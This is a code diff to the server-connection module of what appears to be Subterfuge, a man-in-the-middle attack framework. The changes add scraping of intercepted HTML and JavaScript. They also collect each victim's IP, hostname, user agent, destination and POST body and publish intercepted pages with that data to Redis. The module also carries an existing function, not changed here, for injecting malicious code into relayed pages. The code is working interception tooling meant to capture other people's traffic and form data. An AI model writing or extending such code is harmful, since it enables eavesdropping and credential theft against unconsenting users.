@@ -20,6 +20,7 @@ import logging, re, string, random, zlib, gzip, StringIO, os, json, socket
 
 import sys
 import time
+import chardet
 sys.path.append('/usr/share/subterfuge')
 import threading
   #Ignore Deprication Warnings
@@ -42,6 +43,7 @@ from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
 from ImageScraper import ImageScraper
 from CSSScraper import CSSScraper
+from JSScraper import JSScraper
 from jjredis.RedisClient import RedisClient
 
 class ServerConnection(HTTPClient):
@@ -64,6 +66,8 @@ class ServerConnection(HTTPClient):
         self.urlMonitor       = URLMonitor.getInstance()
         self.isImageRequest   = False
         self.isCSSRequest     = False
+        self.isJavascriptRequest = False
+        self.isHTMLRequest    = False
         self.isCompressed     = False
         self.contentLength    = None
         self.shutdownComplete = False
@@ -90,14 +94,37 @@ class ServerConnection(HTTPClient):
         print "Resuming Injection"
         iptrack.objects.filter(address = clientip).update(injected = "0")
 
-    def publishToRedisIfHtml(self, data, clientip):
+    def publishToRedisIfHtml(self, page, clientip):
         #print data
-        print "PUBLISHING WEBPAGE"
-        try:
-            RedisClient.getInstance().publish('new:webpage', '{"foo":"bar"}')
-        except:
-            print "failed"
-            pass
+        if self.isHTMLRequest and ('<html' in page):
+            print "PUBLISHING WEBPAGE"
+            data = self.getConnectionInfos(clientip)
+            decodedPage = self.decodePage(page)
+            data['page'] = decodedPage['page']
+            data['encoding'] = decodedPage['encoding']
+            try:
+                RedisClient.getInstance().publish('new:webpage', json.dumps(data))
+            except:
+                print "Publishing webpage failed"
+                pass
+
+    def decodePage(self, page):
+        d = {}
+        d['encoding'] = ''
+        res = chardet.detect(page)
+        print res
+        if res and res['encoding']:
+            enc = res['encoding']
+            print "Encoding: " + enc
+            #enc = 'ISO-8859-1'
+            try:
+                a = page.decode(enc)
+                d['page'] = a.encode('utf8')
+            except:
+                print "decoding failed..."
+                pass
+            d['encoding'] = enc
+        return d
 
         #Added by 0sm0s1z to allow for injection of malicious code into the relayed webpage
     def injectMaliciousCode(self, data, clientip):   
@@ -137,6 +164,24 @@ class ServerConnection(HTTPClient):
     def getPostPrefix(self):
         return "POST"
 
+    def getConnectionInfos(self, clientip):
+        d = {}
+        d['IP'] = clientip
+        try:
+            d['Hostname'] = socket.gethostbyaddr(clientip)[0]
+        except:
+            pass
+        d['UAgent'] = self.headers['user-agent']
+        d['Method'] = self.command
+        d['DestIP'] = str(socket.gethostbyname(self.headers['host']))
+        d['DestHost'] = self.headers['host']
+        d['URI'] = self.uri
+        if self.postData:
+            d['POST'] = self.postData 
+
+        return d
+
+    #@deprecated
     def getConnectionInfoAsJSONScript(self, clientip):
         retVal = '<script type="application/json" id="mitm-scraper-conn-info">'
         d = {}
@@ -196,6 +241,12 @@ class ServerConnection(HTTPClient):
             if (value.find('css') != -1):
                 self.isCSSRequest = True
 
+            if (value.find('html') != -1):
+                self.isHTMLRequest = True
+
+            if (value.find('javascript') != -1):
+                self.isJavascriptRequest = True
+
         if (key.lower() == 'content-encoding'):
             if (value.find('gzip') != -1):
                 logging.debug("Response is compressed...")
@@ -248,6 +299,10 @@ class ServerConnection(HTTPClient):
         elif self.isCSSRequest:
             cssScraper = CSSScraper(self.headers['host'], self.client, data)
             cssScraper.save()
+
+        elif self.isJavascriptRequest:
+            jsScraper = JSScraper(self.headers['host'], self.client, data)
+            jsScraper.save()
 
         else:
             #print data           
